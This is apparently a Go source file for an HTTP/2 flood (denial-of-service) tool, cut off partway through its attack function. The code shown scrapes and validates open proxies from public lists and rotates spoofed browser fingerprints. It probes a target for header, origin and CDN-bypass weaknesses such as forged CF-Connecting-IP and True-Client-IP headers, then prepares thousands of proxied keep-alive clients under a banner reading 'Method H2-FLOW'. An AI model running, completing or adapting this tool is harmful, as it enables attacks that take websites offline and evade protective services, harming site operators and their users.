package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	Speed          = 7500
	to             = 6 * time.Second
	KEP            = 30 * time.Second
	SCRAPE_WORKERS = 1500
	CHECK_WORKERS  = 1500
	CHECK_TIMEOUT  = 3 * time.Second
	RETRY_COUNT    = 1
)

type BPF struct {
	UA           string
	Accept       string
	Lang         string
	Encoding     string
	SecChUa      string
	SecChUaMov   string
	SecChUaPlat  string
	SecFetchSite string
	SecFetchMode string
	SecFetchDest string
	Referer      string
	Origin       string
	DNT          string
}

var PFS = []BPF{
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "macOS",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?1",
		SecChUaPlat:  "Android",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.bing.com/search?q=",
		Origin:       "https://www.bing.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "",
	},
}

var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
var REF = []string{
	"https://www.google.com/search?q=",
	"https://www.bing.com/search?q=",
	"https://www.yahoo.com/search?p=",
	"https://www.duckduckgo.com/?q=",
}

type CLI struct {
	client *http.Client
	ip     string
}

type Proxy struct {
	IP   string
	Port string
}

type ProxyManager struct {
	mu       sync.RWMutex
	proxies  map[string]Proxy
	filePath string
}

type ORPL struct {
	Origin       string
	Referer      string
	SecFetchSite string
}

type headerItem struct {
	key, value string
}

var (
	stateMutex    sync.Mutex
	attackState   string
	cooldownUntil time.Time
	proxyManager  *ProxyManager

	scanMutex   sync.Mutex
	scanRunning bool
	scanCancel  context.CancelFunc
	scanCtx     context.Context

	scrapeMutex   sync.Mutex
	scrapeRunning bool
	scrapeCancel  context.CancelFunc
	scrapeCtx     context.Context

	tunnelMutex sync.Mutex
	tunnelHost  string
	tunnelReady bool
)

var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func RIP(rng *rand.Rand) string {
	return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
}

func RST(rng *rand.Rand, length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

func PMP(target string) int {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
	berhasil := 0
	for _, size := range sizes {
		testURL := target
		if strings.Contains(testURL, "?") {
			testURL += "&big=" + strings.Repeat("x", size)
		} else {
			testURL += "?big=" + strings.Repeat("x", size)
		}
		req, _ := http.NewRequest("GET", testURL, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			berhasil = size
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestURITooLong || resp.StatusCode == 413 {
			break
		} else {
			break
		}
	}
	return berhasil
}

func PMH(target string) int {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
	berhasil := 0
	for _, size := range sizes {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("X-Large-Data", strings.Repeat("x", size))
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			berhasil = size
		} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == 413 || resp.StatusCode == 431 {
			break
		} else {
			break
		}
	}
	return berhasil
}

func PHR(target string, proxyX string) map[string]bool {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	parsedTarget, _ := url.Parse(target)
	targetHost := parsedTarget.Hostname()
	if proxyX == "" {
		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
		proxyX = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
	}
	headersBypas := []string{
		"X-Original-URL",
		"X-Forwarded-Host",
		"X-Request-ID",
		"CDN-Loop",
		"CF-Connecting-IP",
		"True-Client-IP",
	}
	result := make(map[string]bool)
	for _, h := range headersBypas {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		switch h {
		case "X-Original-URL":
			req.Header.Set("X-Original-URL", "/"+RST(rand.New(rand.NewSource(time.Now().UnixNano())), 8))
		case "X-Forwarded-Host":
			req.Header.Set("X-Forwarded-Host", targetHost)
		case "X-Request-ID":
			req.Header.Set("X-Request-ID", strconv.FormatInt(rand.Int63(), 16))
		case "CDN-Loop":
			req.Header.Set("CDN-Loop", "cloudflare")
		case "CF-Connecting-IP":
			req.Header.Set("CF-Connecting-IP", proxyX)
		case "True-Client-IP":
			req.Header.Set("True-Client-IP", proxyX)
		}
		resp, err := client.Do(req)
		if err != nil {
			result[h] = false
			continue
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			result[h] = true
		} else {
			result[h] = false
		}
	}
	return result
}

func HSUPPORT(target string) string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	port := "443"
	conn, err := tls.Dial("tcp", net.JoinHostPort(host, port), &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2", "http/1.1"},
	})
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	proto := conn.ConnectionState().NegotiatedProtocol
	if proto == "h2" {
		return "H2"
	} else if proto == "http/1.1" {
		return "H1"
	}
	return "H3"
}

func ORIGIN(target string) []string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	candidates := []string{
		"https://" + host,
		"https://www.google.com",
		"https://www.bing.com",
		"https://www.yahoo.com",
		"",
	}
	var valid []string
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for _, origin := range candidates {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if origin != "" {
			req.Header.Set("Origin", origin)
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, origin)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "https://"+host)
	}
	return valid
}

func UA_TEST(target string) []string {
	testUAs := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	}
	var valid []string
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for _, ua := range testUAs {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", ua)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, ua)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, testUAs[0])
	}
	return valid
}

func REFFERER(target string) []string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	testReferers := []string{
		"https://" + host + "/",
		"https://www.google.com/search?q=" + host,
		"https://www.bing.com/search?q=" + host,
		"https://www.yahoo.com/search?p=" + host,
		"",
	}
	var valid []string
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for _, ref := range testReferers {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if ref != "" {
			req.Header.Set("Referer", ref)
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, ref)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "https://"+host+"/")
	}
	return valid
}

func HMETHOD(target string) []string {
	methods := []string{"GET", "POST", "OPTIONS"}
	var valid []string
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for _, method := range methods {
		req, _ := http.NewRequest(method, target, nil)
		if method == "POST" {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			req.Body = io.NopCloser(strings.NewReader(""))
		}
		req.Header.Set("User-Agent", "Mozilla/5.0")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, method)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "GET")
	}
	return valid
}

func ENCOD(target string) []string {
	encodings := []string{"gzip, deflate, br", "gzip, deflate", "gzip", "br", "identity"}
	var valid []string
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for _, enc := range encodings {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Accept-Encoding", enc)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, enc)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "gzip, deflate, br")
	}
	return valid
}

func CACH(target string) []string {
	controls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate"}
	var valid []string
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for _, cc := range controls {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Cache-Control", cc)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, cc)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "no-cache")
	}
	return valid
}

func GPFO(origin string, host string) ORPL {
	switch origin {
	case "https://" + host:
		return ORPL{
			Origin:       origin,
			Referer:      "https://" + host + "/",
			SecFetchSite: "same-origin",
		}
	case "https://www.google.com":
		return ORPL{
			Origin:       origin,
			Referer:      "https://www.google.com/search?q=" + host,
			SecFetchSite: "cross-site",
		}
	case "https://www.bing.com":
		return ORPL{
			Origin:       origin,
			Referer:      "https://www.bing.com/search?q=" + host,
			SecFetchSite: "cross-site",
		}
	case "https://www.yahoo.com":
		return ORPL{
			Origin:       origin,
			Referer:      "https://www.yahoo.com/search?p=" + host,
			SecFetchSite: "cross-site",
		}
	default:
		return ORPL{
			Origin:       "",
			Referer:      "",
			SecFetchSite: "cross-site",
		}
	}
}

func NewProxyManager(filePath string) *ProxyManager {
	pm := &ProxyManager{
		proxies:  make(map[string]Proxy),
		filePath: filePath,
	}
	pm.load()
	return pm
}

func (pm *ProxyManager) load() {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	f, err := os.Open(pm.filePath)
	if err != nil {
		return
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		ip, port := parseLine(line)
		if ip != "" && port != "" {
			pm.proxies[ip+":"+port] = Proxy{ip, port}
		}
	}
}

func (pm *ProxyManager) save() {
	pm.mu.RLock()
	defer pm.mu.RUnlock()
	f, err := os.Create(pm.filePath)
	if err != nil {
		return
	}
	defer f.Close()
	w := bufio.NewWriter(f)
	for _, p := range pm.proxies {
		w.WriteString(p.IP + ":" + p.Port + "\n")
	}
	w.Flush()
}

func (pm *ProxyManager) Add(proxies []Proxy) int {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	added := 0
	for _, p := range proxies {
		key := p.IP + ":" + p.Port
		if _, ok := pm.proxies[key]; !ok {
			pm.proxies[key] = p
			added++
		}
	}
	if added > 0 {
		go pm.save()
	}
	return added
}

func (pm *ProxyManager) GetProxies() []Proxy {
	pm.mu.RLock()
	defer pm.mu.RUnlock()
	out := make([]Proxy, 0, len(pm.proxies))
	for _, p := range pm.proxies {
		out = append(out, p)
	}
	return out
}

func (pm *ProxyManager) Count() int {
	pm.mu.RLock()
	defer pm.mu.RUnlock()
	return len(pm.proxies)
}

func (pm *ProxyManager) RemoveDead(dead []string) {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	for _, key := range dead {
		delete(pm.proxies, key)
	}
	go pm.save()
}

func parseLine(line string) (ip, port string) {
	if i := strings.Index(line, "://"); i != -1 {
		line = line[i+3:]
	}
	parts := strings.SplitN(line, ":", 2)
	if len(parts) != 2 {
		return "", ""
	}
	ip = parts[0]
	port = strings.SplitN(parts[1], " ", 2)[0]
	port = strings.SplitN(port, "/", 2)[0]
	if net.ParseIP(ip) == nil && !strings.Contains(ip, ".") {
		return "", ""
	}
	for _, c := range ip + ":" + port {
		if !(c >= '0' && c <= '9' || c == '.' || c == ':') {
			return "", ""
		}
	}
	return ip, port
}

var proxySources = []string{
	"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
	"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
	"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-http.txt",
	"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
	"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
	"https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
	"https://raw.githubusercontent.com/joy-deploy/free-proxy-list/main/data/latest/types/http/proxies.txt",
	"https://raw.githubusercontent.com/fyvri/fresh-proxy-list/archive/storage/classic/http.txt",
	"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies/http.txt",
	"https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
	"https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
	"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/http.txt",
	"https://raw.githubusercontent.com/elli0t43/proxy-list/master/http.txt",
	"https://raw.githubusercontent.com/hookzof/socks5_list/master/txt/http.txt",
	"https://raw.githubusercontent.com/a2u/free-proxy-list/main/http.txt",
	"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
}

func scrapeProxies(ctx context.Context) []Proxy {
	chSrc := make(chan string, len(proxySources))
	chRes := make(chan Proxy, 10000)
	var wg sync.WaitGroup
	for i := 0; i < SCRAPE_WORKERS; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{
				Timeout: 5 * time.Second,
				Transport: &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				},
			}
			for url := range chSrc {
				select {
				case <-ctx.Done():
					return
				default:
				}
				resp, err := client.Get(url)
				if err != nil {
					continue
				}
				body, _ := io.ReadAll(resp.Body)
				resp.Body.Close()
				scanner := bufio.NewScanner(strings.NewReader(string(body)))
				for scanner.Scan() {
					select {
					case <-ctx.Done():
						return
					default:
					}
					line := strings.TrimSpace(scanner.Text())
					if line == "" || strings.HasPrefix(line, "#") {
						continue
					}
					ip, port := parseLine(line)
					if ip != "" && port != "" {
						chRes <- Proxy{ip, port}
					}
				}
			}
		}()
	}
	for _, src := range proxySources {
		chSrc <- src
	}
	close(chSrc)
	go func() {
		wg.Wait()
		close(chRes)
	}()
	m := make(map[string]Proxy)
	for p := range chRes {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		m[p.IP+":"+p.Port] = p
	}
	out := make([]Proxy, 0, len(m))
	for _, p := range m {
		out = append(out, p)
	}
	return out
}

func checkProxies(proxies []Proxy, ctx context.Context) []Proxy {
	if len(proxies) == 0 {
		return nil
	}
	var wg sync.WaitGroup
	input := make(chan Proxy, 5000)
	output := make(chan Proxy, 5000)
	for i := 0; i < CHECK_WORKERS; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for p := range input {
				select {
				case <-ctx.Done():
					return
				default:
				}
				proxyURL, _ := url.Parse("http://" + p.IP + ":" + p.Port)
				transport := &http.Transport{
					TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
					DisableKeepAlives: true,
					DialContext: (&net.Dialer{
						Timeout:   CHECK_TIMEOUT,
						KeepAlive: 0,
					}).DialContext,
					Proxy: http.ProxyURL(proxyURL),
				}
				client := &http.Client{
					Transport: transport,
					Timeout:   CHECK_TIMEOUT,
				}
				ok := false
				for retry := 0; retry <= RETRY_COUNT; retry++ {
					select {
					case <-ctx.Done():
						return
					default:
					}
					ctx2, cancel := context.WithTimeout(ctx, CHECK_TIMEOUT)
					req, _ := http.NewRequestWithContext(ctx2, "GET", "http://clients3.google.com/generate_204", nil)
					resp, err := client.Do(req)
					cancel()
					if err == nil && resp.StatusCode == 204 {
						io.Copy(io.Discard, resp.Body)
						resp.Body.Close()
						ok = true
						break
					}
					if resp != nil {
						resp.Body.Close()
					}
				}
				if ok {
					select {
					case <-ctx.Done():
						return
					default:
					}
					output <- p
				}
			}
		}()
	}
	go func() {
		for _, p := range proxies {
			select {
			case <-ctx.Done():
				return
			default:
			}
			input <- p
		}
		close(input)
	}()
	go func() {
		wg.Wait()
		close(output)
	}()
	var alive []Proxy
	for p := range output {
		alive = append(alive, p)
	}
	return alive
}

func runAttack(tgt string, dur int, cookie string) {
	parsed, _ := url.Parse(tgt)
	host := parsed.Hostname()
	if strings.HasPrefix(host, "www.") {
		host = host[4:]
	}
	proxies := proxyManager.GetProxies()
	var PRX []*url.URL
	for _, p := range proxies {
		prx, _ := url.Parse("http://" + p.IP + ":" + p.Port)
		if prx != nil {
			PRX = append(PRX, prx)
		}
	}
	if len(PRX) == 0 {
		PRX = append(PRX, nil)
	}
	var ProxyX string
	var proxyIPs []string
	for _, p := range PRX {
		if p != nil {
			proxyIPs = append(proxyIPs, p.Hostname())
		}
	}
	if len(proxyIPs) > 0 {
		ProxyX = proxyIPs[0]
	}
	ipPool := proxyIPs
	if len(ipPool) == 0 {
		ipPool = []string{"127.0.0.1", "8.8.8.8", "1.1.1.1", "192.168.1.1", "10.0.0.1"}
	}

	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	var (
		MaxP      int
		MaxHead   int
		Supported map[string]bool
		HVERSI    string
		VORI      []string
		VUAS      []string
		VREF      []string
		VMET      []string
		VENC      []string
		VCAC      []string
	)

	var wg sync.WaitGroup
	wg.Add(10)
	var probeDone int
	var probeMu sync.Mutex
	printProbe := func(name string) {
		probeMu.Lock()
		probeDone++
		done := probeDone
		probeMu.Unlock()
		fmt.Printf("[ Bypassed ] ▶ [ %-10s ] ▶ [ %d%% ]\n", name, (done*100)/10)
	}
	go func() {
		defer wg.Done()
		MaxP = PMP(tgt)
		printProbe("PMP")
	}()
	go func() {
		defer wg.Done()
		MaxHead = PMH(tgt)
		printProbe("PMH")
	}()
	go func() {
		defer wg.Done()
		Supported = PHR(tgt, ProxyX)
		printProbe("PHR")
	}()
	go func() {
		defer wg.Done()
		HVERSI = HSUPPORT(tgt)
		printProbe("HSP")
	}()
	go func() {
		defer wg.Done()
		VORI = ORIGIN(tgt)
		printProbe("ORIGIN")
	}()
	go func() {
		defer wg.Done()
		VUAS = UA_TEST(tgt)
		printProbe("UA")
	}()
	go func() {
		defer wg.Done()
		VREF = REFFERER(tgt)
		printProbe("REFFERER")
	}()
	go func() {
		defer wg.Done()
		VMET = HMETHOD(tgt)
		printProbe("HMETHOD")
	}()
	go func() {
		defer wg.Done()
		VENC = ENCOD(tgt)
		printProbe("ENCOD")
	}()
	go func() {
		defer wg.Done()
		VCAC = CACH(tgt)
		printProbe("CACHE")
	}()
	wg.Wait()
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

	wcs := make([]CLI, len(PRX))
	for i, ProxyY := range PRX {
		tr := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   4 * time.Second,
				KeepAlive: KEP,
			}).DialContext,
			DisableKeepAlives:     false,
			DisableCompression:    false,
			MaxIdleConns:          10000,
			MaxIdleConnsPerHost:   5000,
			MaxConnsPerHost:       0,
			IdleConnTimeout:       KEP,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				NextProtos:         []string{"h2", "http/1.1"},
				CipherSuites: []uint16{
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				},
			},
			ForceAttemptHTTP2:     true,
			TLSHandshakeTimeout:   4 * time.Second,
			ResponseHeaderTimeout: 4 * time.Second,
			ExpectContinueTimeout: 0 * time.Second,
		}
		ip := ""
		if ProxyY != nil {
			tr.Proxy = http.ProxyURL(ProxyY)
			ip = ProxyY.Hostname()
		}
		jar, _ := cookiejar.New(nil)
		client := &http.Client{
			Transport: tr,
			Timeout:   to,
			Jar:       jar,
		}
		wcs[i] = CLI{client: client, ip: ip}
	}

	fmt.Printf("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	printInfo := func(label, value, status string) {
		if status != "" {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s %s[%s%s%s]\n",
				"\033[32m", "\033[0m",
				"\033[37m", label, "\033[0m",
				"\033[31m", "\033[0m",
				"\033[37m", value, "\033[0m",
				"\033[31m", "\033[32m", status, "\033[31m",
			)
		} else {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s\n",
				"\033[32m", "\033[0m",
				"\033[37m", label, "\033[0m",
				"\033[31m", "\033[0m",
				"\033[37m", value, "\033[0m")
		}
	}
	printInfo("Author", "Diz Flyze Ofc              ", "True")
	printInfo("Target", host, "")
	printInfo("Port  ", "443                        ", "True")
	printInfo("Method", "H2-FLOW                    ", "True")
	printInfo("Proxy ", fmt.Sprintf("%d                        ", len(PRX)), "True")
